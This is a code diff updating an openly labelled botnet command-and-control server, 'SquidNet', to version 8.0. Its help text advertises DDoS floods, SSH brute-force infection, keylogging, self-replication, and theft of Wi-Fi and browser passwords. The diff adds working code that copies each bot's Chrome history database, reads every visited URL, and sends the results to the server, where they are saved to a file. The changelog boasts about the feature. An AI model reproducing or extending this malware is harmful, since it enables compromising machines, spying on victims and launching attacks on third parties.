@@ -1,4 +1,4 @@
-import urllib.request, random, socket, time, sys, threading, random, os, hashlib, datetime
+import random, socket, time, sys, threading, random, os, hashlib, datetime
 try:
     """This Module comes with Paramiko."""
     from cryptography.fernet import Fernet
@@ -44,18 +44,18 @@ tar -xf {os.getcwd()}/ngrok.zip
         print(Botnet.log_logo(None))
         print("""
 [+] Option-Parsing Help:
-[+] --ip, --ipaddr     - Specifies the IP to host the Botnet on.
-[+] --p,  --port       - Specifies the Port to host the Botnet on.
-[+] --aU, --adminuser  - Specify Botnet Admin Username.
-[+] --aP, --adminpass  - Specify Botnet Admin Password.
-[+] --pL, --passlist   - Specify a TXT File for SSH Brute-Forcing.
+[+] --ip, --ipaddr        - Specifies the IP to host the Botnet on.
+[+] --p,  --port          - Specifies the Port to host the Botnet on.
+[+] --aU, --adminuser     - Specify Botnet Admin Username.
+[+] --aP, --adminpass     - Specify Botnet Admin Password.
+[+] --pL, --passlist      - Specify a TXT File for SSH Brute-Forcing.
 
 [+] Optional Arguements:
-[+] --i,  --info       - Shows this message.
-[+] --gN, --getngrok   - Downloads Ngrok.
-[+] --eK, --encryptkey - Specify encrypting key for bots.
-[+] --nH, --ngrokhost  - Specify an Ngrok Hostname for external connections.
-[+] --nP, --ngrokport  - Specify an Ngrok Port for external connections.
+[+] --i,  --info          - Shows this message.
+[+] --gN, --getngrok      - Downloads Ngrok.
+[+] --eK, --encryptkey    - Specify encrypting key for bots.
+[+] --eH, --externalhost  - Specify an External Hostname for external connections.
+[+] --eP, --externalport  - Specify an External Port for external connections.
 [+] Note: You need to have an Ngrok domain started for the ngrok arguements to have effect.
 
 [+] Usage:""")
@@ -79,8 +79,8 @@ tar -xf {os.getcwd()}/ngrok.zip
         opt.add_option("--aP", "--adminpass", dest="adminpass")
         opt.add_option("--eK", "--encryptkey", dest="key")
         opt.add_option("--pL", "--passlist", dest="passfile")
-        opt.add_option("--nH", "--ngrokhost", dest="ngrokhost")
-        opt.add_option("--nP", "--ngrokport", dest="ngrokport")
+        opt.add_option("--eH", "--externalhost", dest="ngrokhost")
+        opt.add_option("--eP", "--externalport", dest="ngrokport")
         opt.add_option("--gN", "--getngrok", dest="download", action="store_true")
         opt.add_option("--i", "--info", dest="info", action="store_true")
         arg, opti = opt.parse_args()
@@ -111,7 +111,7 @@ tar -xf {os.getcwd()}/ngrok.zip
         else:
             adminuser = arg.adminuser
         if arg.adminpass is None:
-            adminpass = "root"
+            adminpass = str(random.randint(0,99999999999999999999999999999))
         else:
             adminpass = arg.adminpass
         if arg.key is None:
@@ -175,7 +175,7 @@ class Botnet:
                 self.log(
                     "\n[(ERROR)]: Error starting up server - Brute-forcing file is not in directory!\n[(CLOSE)]: Server is closing.....")
             sys.exit()
-        self.version = "7.5"
+        self.version = "8.0"
         self.connportlist = []
         self.conn_list = []
         self.admin_conn = []
@@ -198,6 +198,7 @@ class Botnet:
         self.listenforconn = True
         self.botscript = self.bot_script()
         self.working = False
+        self.obtaininghistory = False
         self.serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             self.serv.bind((ip, port))
@@ -248,23 +249,24 @@ class Botnet:
 [+] !botcount                            - Gets the amount of connected bots.
 [+] !stopatk                             - Stops any ongoing DDoS Attacks in the Botnet.
 [+] !changedirdesktop                    - Sets the bot working directory to their Desktop.
-[+] !listdir                             - Lists some of the files in the bot working directories(recommended for small botnets)
+[+] !listdir                             - Lists the files in the bot working directories.
 [+] !resettoken                          - Resets the token and changes it to a new token
 [+] !getinfo                             - Gets the OS, cwd, IP, and username of the bots.
 [+] !getip                               - Gets the IP of the bots
-[+] !getwifi                             - Obtains the wifi names and passwords of the bots(windows only)
+[+] !getwifi                             - Obtains the wifi names and passwords of the bots(Windows only).
 [+] !savefile                            - Obtains a file from the bots directory.
 [+] !getcwd                              - Gets the bots working directory.
 [+] !getos                               - Gets the OS Of the bots.
-[+] !getpasswords                        - Gets the stored browser passwords of the bots.
-[+] !rickroll                            - Rick Rolls the Bots.     
+[+] !getpasswords                        - Gets the stored browser passwords of the bots(Windows only).
+[+] !rickroll                            - Rick Rolls the Bots.  
+[+] !getchromehistory                    - Obtains the chrome history of the bots(it needs to already be in the server txt file).   
 [+] !cloneself                           - Self replicates the Bot scripts in the bots.
 
 [+] Commands for SSH Botnet:
 
-[+] !infect [ip] [user]                  - Brute forces login for provided ip and username
-[+] !sshlogin [ip] [user] [pass]         - Logs in the ip with the provided username and password
-[+] !listsshbots                         - Lists all SSH Bots
+[+] !infect [ip] [user]                  - Brute forces login for provided ip and username.
+[+] !sshlogin [ip] [user] [pass]         - Logs in the ip with the provided username and password.
+[+] !listsshbots                         - Lists all SSH Bots.
 
 [+] Any other commands will be made into cmd commands.
                             """
@@ -283,14 +285,14 @@ class Botnet:
     def log_logo(self):
         """Logo of this script."""
         logo = """
-  _____             _     _ _   _      _         ______ _____ 
- / ____|           (_)   | | \ | |    | |       |____  | ____|
-| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __ / /| |__  
- \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / // / |___ \ 
- ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V // /   ___) |
-|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_//_(_) |____/ 
-           | |                                                
-           |_|                                                                                                                                    
+  _____             _     _ _   _      _            ___   ___  
+ / ____|           (_)   | | \ | |    | |          / _ \ / _ \ 
+| (___   __ _ _   _ _  __| |  \| | ___| |_  __   _| (_) | | | |
+ \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / /> _ <| | | |
+ ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V /| (_) | |_| |
+|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/  \___(_)___/ 
+           | |                                                 
+           |_|                                                                                                                     
 TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         return logo
     def logo(self):
@@ -331,22 +333,23 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         print("[+] !botcount                            - Gets the amount of connected bots.")
         print("[+] !stopatk                             - Stops any ongoing DDoS Attacks in the Botnet.")
         print("[+] !changedirdesktop                    - Sets the bot working directory to their Desktop.")
-        print("[+] !listdir                             - Lists some of the files in the bot working directories(recommended for small botnets)")
+        print("[+] !listdir                             - Lists the files in the bot working directories.")
         print("[+] !resettoken                          - Resets the token and changes it to a new token")
         print("[+] !getinfo                             - Gets the OS, cwd, IP, and username of the bots.")
         print("[+] !getip                               - Gets the IP of the bots")
-        print("[+] !getwifi                             - Obtains the wifi names and passwords of the bots(windows only)")
+        print("[+] !getwifi                             - Obtains the wifi names and passwords of the bots(Windows only).")
         print("[+] !savefile                            - Obtains a file from the bots directory.")
         print("[+] !getcwd                              - Gets the bots working directory.")
         print("[+] !getos                               - Gets the OS Of the bots.")
-        print("[+] !getpasswords                        - Gets the stored browser passwords of the bots.")
+        print("[+] !getpasswords                        - Gets the stored browser passwords of the bots(Windows only).")
         print("[+] !rickroll                            - Rick Rolls the Bots.")
         print("[+] !cloneself                           - Self replicates the Bot scripts in the bots.")
+        print("[+] !getchromehistory                    - Check the bots chrome history(Hehehe....)(it will save in an external file).")
         print("\n[+] Commands for SSH Botnet:\n")
         print("[+] !infect [ip] [user]                  - Brute forces login for the provided ip and username.")
         print("[+] !inject [file]                       - Opens FTP and injects a file into an infected host.")
-        print("[+] !sshlogin [ip] [user] [pass]         - Logs in the ip with the provided username and password")
-        print("[+] !listsshbots                         - Lists all SSH Bots")
+        print("[+] !sshlogin [ip] [user] [pass]         - Logs in the ip with the provided username and password.")
+        print("[+] !listsshbots                         - Lists all SSH Bots.")
         print("\n[+] Any other commands will be made into cmd commands.\n")
     def configure_adminfile(self):
         """Creates a file with the admin username and the password.
@@ -506,7 +509,7 @@ ________________________________________________________
         while True:
             try:
                 msg = c.recv(65500)
-                if self.savefile:
+                if self.savefile or self.obtaininghistory:
                     pass
                 else:
                     try:
@@ -532,58 +535,64 @@ ________________________________________________________
                         break
                 if isbot:
                     if not admin:
-                        if msg.startswith('!login'):
-                            msg_split = msg.split()
-                            name = msg_split[1]
-                            passw = msg_split[2]
-                            try:
-                                passw = passw.encode()
-                            except Exception as e:
-                                self.log(f"\n[(ERROR)]: {str(e)}")
-                            hashed_passw = hashlib.md5(passw).hexdigest()
-                            if hashed_passw == self.admin_password and name == self.admin_name:
+                        if str(type(msg)) == "str":
+                            if msg.startswith('!login'):
+                                msg_split = msg.split()
+                                name = msg_split[1]
+                                passw = msg_split[2]
                                 try:
-                                    admin = True
-                                    print(f"[!] {hostname} is an Admin!")
-                                    hostname = f"ADMIN)({hostname}"
-                                    msgtoadmin = f"[(SERVER)]: {hostname} is an Admin!"
-                                    self.log("\n" + msgtoadmin)
-                                    for admi in self.admin_conn:
-                                        try:
-                                            admi.send(msgtoadmin.encode())
-                                        except Exception as e:
-                                            self.log(f"\n[(ERROR)]: {str(e)}")
-                                    self.admin_conn.append(c)
+                                    passw = passw.encode()
+                                except Exception as e:
+                                    self.log(f"\n[(ERROR)]: {str(e)}")
+                                hashed_passw = hashlib.md5(passw).hexdigest()
+                                if hashed_passw == self.admin_password and name == self.admin_name:
                                     try:
-                                        c.send(self.welcomemsg.encode())
+                                        admin = True
+                                        print(f"[!] {hostname} is an Admin!")
+                                        hostname = f"ADMIN)({hostname}"
+                                        msgtoadmin = f"[(SERVER)]: {hostname} is an Admin!"
+                                        self.log("\n" + msgtoadmin)
+                                        for admi in self.admin_conn:
+                                            try:
+                                                admi.send(msgtoadmin.encode())
+                                            except Exception as e:
+                                                self.log(f"\n[(ERROR)]: {str(e)}")
+                                        self.admin_conn.append(c)
+                                        try:
+                                            c.send(self.welcomemsg.encode())
+                                        except:
+                                            pass
+                                        self.log(f"\n[(SERVER)---->({hostname})]: Sent welcome message.")
+                                        self.admininfo.append(info)
                                     except:
                                         pass
-                                    self.log(f"\n[(SERVER)---->({hostname})]: Sent welcome message.")
-                                    self.admininfo.append(info)
-                                except:
-                                    pass
-                            else:
-                                c.send("Access Denied!".encode())
-                                msgtoall = f"[(ATTEMPTEDBREACHWARNING)]: {hostname} attempted to login to the botnet with incorrect credentials!\n[(ATTEMPTEDBREACHWARNING)]: Closing Connection...."
-                                self.log("\n" + msgtoall)
-                                print(msgtoall)
-                                for admins in self.admin_conn:
-                                    try:
-                                        admins.send(msgtoall.encode())
-                                    except Exception as e:
-                                        self.log(f"\n[(ERROR)]: {str(e)}")
-                                c.close()
-                                break
-                        elif msg.startswith("!sendkey"):
-                            msg_split = msg.split()
-                            del msg_split[0]
-                            main_msg = ""
-                            for i in msg_split:
-                                main_msg = main_msg + " " + i
-                            main_msg = main_msg.strip()
-                            logthis = f"[({hostname})]: {main_msg}"
-                            if self.displaykeys:
-                                print(logthis)
+                                else:
+                                    c.send("Access Denied!".encode())
+                                    msgtoall = f"[(ATTEMPTEDBREACHWARNING)]: {hostname} attempted to login to the botnet with incorrect credentials!\n[(ATTEMPTEDBREACHWARNING)]: Closing Connection...."
+                                    self.log("\n" + msgtoall)
+                                    print(msgtoall)
+                                    for admins in self.admin_conn:
+                                        try:
+                                            admins.send(msgtoall.encode())
+                                        except Exception as e:
+                                            self.log(f"\n[(ERROR)]: {str(e)}")
+                                    c.close()
+                                    break
+                            elif msg.startswith("!sendkey"):
+                                msg_split = msg.split()
+                                del msg_split[0]
+                                main_msg = ""
+                                for i in msg_split:
+                                    main_msg = main_msg + " " + i
+                                main_msg = main_msg.strip()
+                                logthis = f"[({hostname})]: {main_msg}"
+                                if self.displaykeys:
+                                    print(logthis)
+                        if self.obtaininghistory:
+                            try:
+                                self.historyfile.write(f"\n[({hostname})]: ".encode()+msg)
+                            except:
+                                pass
                     if admin:
                         if msg.startswith('!httpflood'):
                             msgtobot = msg.split()
@@ -618,6 +627,17 @@ ________________________________________________________
                                 c.send("Invalid Parameters!".encode())
                                 self.log(
                                     f"\n[(SERVER)---->({hostname})]: Invalid Parameters!")
+                        elif msg.startswith("!getchromehistory"):
+                            try:
+                                file = open("BotsHistory.txt", "rb").read()
+                                if len(str(file)) == 0:
+                                    c.send(
+                                        "[(SERVER)]: Unable to send Bots history from the bots(Needs to be obtained on the server-side).".encode())
+                                else:
+                                    c.send("[(SERVER)]:".encode() + file)
+                            except:
+                                c.send(
+                                    "[(SERVER)]: Unable to send Bots history from the bots(Needs to be obtained on the server-side).".encode())
                         elif msg.startswith('!udpflood'):
                             msgtobot = msg.split()
                             try:
@@ -674,7 +694,7 @@ ________________________________________________________
                         elif msg.startswith("!listsshbots"):
                             c.send(f"[(SERVER)]: Connected SSH Bots: {self.display_bots}".encode())
                             self.log(f"\n[(SERVER)---->({hostname})]: Connected SSH Bots: {self.display_bots}")
-                        if "!login" in msg.strip() or "!help" in msg.strip() or "!getconninfo" in msg.strip() or "!listsshbots" in msg.strip():
+                        if "!login" in msg.strip() or "!help" in msg.strip() or "!getconninfo" in msg.strip() or "!listsshbots" in msg.strip() or "!getchromehistory" in msg.strip() or self.obtaininghistory:
                             pass
                         else:
                             if len(self.ssh_bots) != 0:
@@ -726,10 +746,11 @@ ________________________________________________________
                             file_created = False
                     elif not self.savefile:
                         try:
-                            msgtoadmin = f"[({hostname})]: {msg.strip()}"
-                            self.log("\n" + msgtoadmin)
-                            if not msg.startswith("!sendkey"):
-                                print("\n" + msgtoadmin)
+                            if not self.obtaininghistory:
+                                msgtoadmin = f"[({hostname})]: {msg.strip()}"
+                                self.log("\n" + msgtoadmin)
+                                if not msg.startswith("!sendkey"):
+                                    print("\n" + msgtoadmin)
                         except Exception as e:
                             self.log(f"\n[(ERROR)]: {e}")
                         for adminconn in self.admin_conn:
@@ -893,6 +914,13 @@ ________________________________________________________
             os.chdir(self.cwd)
         except:
             pass
+    def reset_historyvar(self):
+        """Resets the 'self.obtaininghistory' variable to false,
+        so that the bot messages would return to normal."""
+        time.sleep(10)
+        self.obtaininghistory = False
+        self.historyfile.close()
+        print("\n[+] You are now able to freely send messages to the bots.")
     def instruct(self):
         """Server-Side Sending intructions to the bots. This is so that the Server
         can also send packets to the Bots which they can send info back to the Server
@@ -932,6 +960,14 @@ ________________________________________________________
                     except:
                         self.instruction = "help"
                         print("[+] Invalid Parameters!\n")
+                elif self.instruction.startswith("!getchromehistory"):
+                    self.obtaininghistory = True
+                    print("[+] Obtaining Bot Chrome history. It is highly suggested you do not give any commands at the moment.")
+                    print("[+] Please wait 10 seconds before doing anything.")
+                    self.historyfile = open("BotsHistory.txt","wb")
+                    print("[+] File with Bot Chrome History: BotsHistory.txt")
+                    resetter = threading.Thread(target=self.reset_historyvar)
+                    resetter.start()
                 elif self.instruction.startswith("!tcpflood"):
                     msgtobot = self.instruction.split()
                     try:
@@ -1060,8 +1096,13 @@ ________________________________________________________
 [+] - Added '!kick' and '!togglelisten'
 [+] - Added Keylogging to the bots.
 [+] - Added display message when there is an error with binding the server.
-[+] - Fixed bug that kicks bots when wanting to view content from a file remotely.
+[+] - Fixed bug that kicks bots when wanting to view content from a file remotely or when sending bytes.
 [+] - Improved Logging Function.
+[+] - Replace '--nH' and '--nP' arguements with '--eH' and '--eP'(external-host and port).
+[+] - Replaced some text in the help message.
+[+] - Made default admin password a random integer, rather than 'root'.
+[+] - Removed unnessecary modules.
+[+] - Chrome history obtaining is now possible on the bots ;).
                     """)
                 if "!clear" in self.instruction.strip() or "!genscript" in self.instruction.strip() or "!genadminscript".strip() in self.instruction.strip() or "!whatsnew" in self.instruction.strip() or "!getconninfo" in self.instruction.strip() or "listsshbots" in self.instruction.strip() or "!togglelisten" in self.instruction.strip():
                     pass
@@ -4913,6 +4954,23 @@ OS:       {sys.platform}
             os.system(f'start {website}')
         else:
             os.system(f'open {website}')
+    def send_history(self):
+        dirs = os.getcwd()
+        os.chdir(f"C:/Users/{os.getlogin()}/AppData/Local/Google/Chrome/User Data/Default/")
+        shutil.copyfile("History", dirs + "/History.db")
+        os.chdir(dirs)
+        History = sqlite3.connect("History.db")
+        cursor = History.cursor()
+        e = cursor.execute("SELECT last_visit_time, visit_count, title, url from urls")
+        for i in cursor.fetchall():
+            time = i[0]
+            visit_count = i[1]
+            url = i[3]
+            title = i[2]
+            epoch = datetime(1601, 1, 1)
+            url_time = epoch + timedelta(microseconds=time)
+            self.send(f"({url_time}) ({visit_count}) ({title}) ({url})".encode())
+        os.remove("History.db")
     def run_cmd(self):
         try:
             if self.fileeditor:
@@ -5005,6 +5063,8 @@ OS:       {sys.platform}
                 elif self.msg.startswith('!viewfilecontent'):
                     file = self.returnsecondstr(self.msg)
                     self.file_content(file)
+                elif self.msg.startswith("!getchromehistory"):
+                    self.send_history()
                 elif self.msg.startswith('!mkdir'):
                     main_msg = self.msg.split()
                     dirname = main_msg[1]
@@ -5251,19 +5311,20 @@ class Web_Interface:
             pass
         else:
             conn.close()
-"""Clears CMD Output."""
-if sys.platform == "win32":
-    os.system("cls")
-else:
-    os.system("clear")
-try:
-    """Tries to import this module."""
-    import paramiko
-except:
-    """Since paramiko is not an official Python Module,
-    the user may need to download Paramiko themself."""
-    Botnet.logo(None)
-    print("\n[+] Missing Module: Paramiko\n[+] If you have python 3 installed, try: pip install paramiko")
-    input("[+] Press 'Enter' to exit.")
-    sys.exit()
-botnet = ArguementParse()
+if __name__ == '__main__':
+    """Clears CMD Output."""
+    if sys.platform == "win32":
+        os.system("cls")
+    else:
+        os.system("clear")
+    try:
+        """Tries to import this module."""
+        import paramiko
+    except:
+        """Since paramiko is not an official Python Module,
+        the user may need to download Paramiko themself."""
+        Botnet.logo(None)
+        print("\n[+] Missing Module: Paramiko\n[+] If you have python 3 installed, try: pip install paramiko")
+        input("[+] Press 'Enter' to exit.")
+        sys.exit()
+    botnet = ArguementParse()
